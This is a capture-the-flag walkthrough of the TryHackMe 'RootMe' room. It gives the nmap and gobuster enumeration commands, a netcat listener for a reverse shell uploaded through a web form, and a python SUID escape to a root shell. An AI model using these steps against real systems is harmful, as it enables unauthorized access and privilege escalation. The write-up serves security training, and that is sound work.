# RootMe

![RootMe](./images/RootMe.png)

[RootMe](https://tryhackme.com/r/room/rrootme) is listed as an easy room, and covers a lot of different tools and aspects of security, which makes it a great room to complete for beginners.
An overview of what we’ll be using is listed here:  

* Basic linux commands
* Nmap scan
* Gobuster
* Netcat

## Task 1 - Deploy the machine

Set up environment IP as IP_Machine

```
export IP=10.10.234.161
```

![task1-IP](./images/task1-IP.png)

## Task 2 - Reconnaissance

* Scan the machine, how many ports are open?
	
	```
	nmap -sV $IP | tee -a nmap-default.txt
	```

	File scan resulted [here](./files/nmap-default.txt)

	![task2-nmap](./images/task2-nmap.png)

* What version of Apache is running?
	
	![task2-version](./images/task2-version.png)

* What service is running on port 22?
	
	![task2-ssh](./images/task2-ssh.png)

* Find directories on the web server using the GoBuster tool. What is the hidden directory?
	
	```
	gobuster dir -w /usr/share/wordlists/dirb/common.txt -u $IP | tee -a gobuster-default.txt
	```

	File scan resulted [here](./files/gobuster-default.txt)

	![task2-gobuster](./images/task2-gobuster.png)
	

## Task 3 - Getting a shell

* Find a form to upload and get a reverse shell, and find the flag `user.txt`
	
	* Upload reverse shell 
		
		![task3-reverse](./images/task3-reverse.png)

	* Open terminal for netcat listening
	
		```
		nc -nvlp 8888
		```

		![task3-nc](./images/task3-nc.png)

	* Open file upload from website
	
		![task3-shell](./images/task3-shell.png)

	* Get access to server

		![task3-access](./images/task3-access.png)

	* Find and read file `user.txt`
	
		![task3-user-txt](./images/task3-user-txt.png)

## Task 4 - Privilege escalation

* Search for files with SUID permission, which file is weird? 

	```
	find / -type f -perm -4000 -ls 2>/dev/null
	```

	![task4-find](./images/task4-find.png)

* root.txt

	```
	/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
	```

	![task4-root-txt](./images/task4-root-txt.png)



